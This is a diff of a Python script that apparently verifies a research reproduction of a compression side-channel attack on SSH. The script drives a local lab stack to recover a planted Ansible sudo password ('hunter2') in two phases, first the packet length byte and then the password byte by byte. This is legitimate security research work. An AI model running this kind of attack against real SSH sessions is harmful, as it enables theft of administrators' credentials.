@@ -1,21 +1,14 @@
-"""Verify the Ansible attack variant and run the hunter2 test.
+"""End-to-end verification for the Ansible variant (Section 5.3).
 
 Run from the host while the docker-compose stack is up:
 
     python scripts/verify_ansible.py
 
-Checks:
-  1. HTTP control APIs are reachable
-  2. SSH connection up with zlib compression (main tunnel)
-  3. Client reports the Ansible LocalForward configured in
-     /root/.ssh/config
-  4. /set_sudo_secret works (root SSH + chpasswd round-trip)
-  5. /send_secret_ansible kicks off a fresh ansible-playbook run,
-     waits for the "Sending become_password" marker, and returns
-     success
-  6. Phase 1: recover the 1-byte CHANNEL_DATA data-length field
-  7. Phase 2: recover the sudo password byte-by-byte and check that
-     it matches the planted value ("hunter2")
+Checks: HTTP control APIs reachable, SSH up with zlib compression,
+Ansible LocalForward declared, /set_sudo_secret round-trip works,
+/send_secret_ansible reaches the "Sending become_password" marker, and
+a two-phase recovery of "hunter2" (CHANNEL_DATA length byte then the
+password itself).
 """
 
 from __future__ import annotations
@@ -29,14 +22,13 @@ import urllib.request
 ATTACKER_BASE = "http://127.0.0.1:9000"
 CLIENT_BASE = "http://127.0.0.1:8000"
 
-# 8-byte CHANNEL_DATA header prefix for a session-channel packet.  See
-# attacker/attack/adapters/ansible.py for the full derivation.
+# 8-byte CHANNEL_DATA header prefix for a session-channel packet.
 PHASE1_PREFIX = "\x5e\x00\x00\x00\x00\x00\x00\x00"
-# Plausible password length bytes (accounts for up to a 31-char password
-# + trailing \n).  All below 0x80 so UTF-8 encoding is a no-op.
+# Plausible password length bytes (covers up to a 31-char password
+# + trailing \n). All below 0x80 so UTF-8 encoding is a no-op.
 PHASE1_ALPHABET = "".join(chr(i) for i in range(1, 33))
 PHASE2_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"
-TARGET_SECRET = "hunter2"  # len+1 = 8 → length byte = \x08
+TARGET_SECRET = "hunter2"  # len+1 = 8 -> length byte = \x08
 
 
 def http(method: str, url: str, body: bytes | None = None,
@@ -111,7 +103,6 @@ def main() -> int:
 
     step("4. Trigger /send_secret_ansible and capture the packet log")
     http("POST", f"{ATTACKER_BASE}/clear_log")
-    print("  [..] cleared packet log")
     t0 = time.time()
     trigger_resp = http("POST", f"{CLIENT_BASE}/send_secret_ansible")
     dt = time.time() - t0
@@ -135,8 +126,6 @@ def main() -> int:
     print(f"  [ok] c->s traffic while ansible is running: {c2s_bytes} bytes")
 
     step("5. Ansible attack: recover hunter2")
-    # Rotate the sudo secret one more time so the length byte we're
-    # about to recover is freshly known.
     http("POST", f"{CLIENT_BASE}/set_sudo_secret",
          body=json.dumps({"value": TARGET_SECRET}).encode("utf-8"),
          content_type="application/json")
@@ -144,7 +133,6 @@ def main() -> int:
 
     t_attack = time.time()
 
-    # Phase 1 -- recover the CHANNEL_DATA data-length byte ------------
     print("  Phase 1: recovering CHANNEL_DATA length byte...")
     phase1_body = json.dumps({
         "variant": "ansible",
@@ -155,13 +143,11 @@ def main() -> int:
             "terminator": "\x00",
             "min_margin": 8,
             "max_rounds": 96,
-            # noise_hints is replaced by fixed_single alignment at the
-            # known-winning alignment length (empirically nl=1).
+            # Pin to the empirically winning alignment length (al=1).
             "alignment_mode": "fixed_single",
             "alignment_lengths": [1],
         },
     }).encode("utf-8")
-    t1 = time.time()
     r1 = http("POST", f"{ATTACKER_BASE}/run_attack",
               body=phase1_body, content_type="application/json")
     if not r1.get("ok"):
@@ -179,9 +165,8 @@ def main() -> int:
         fail(f"Phase 1 recovered length 0x{length_byte:02x}, "
              f"expected 0x{expected_len_byte:02x}")
 
-    # Phase 2 -- recover the password byte-by-byte -------------------
     print("  Phase 2: recovering password...")
-    phase2_prefix = PHASE1_PREFIX + length_str  # 9 bytes total
+    phase2_prefix = PHASE1_PREFIX + length_str
     phase2_body = json.dumps({
         "variant": "ansible",
         "config": {
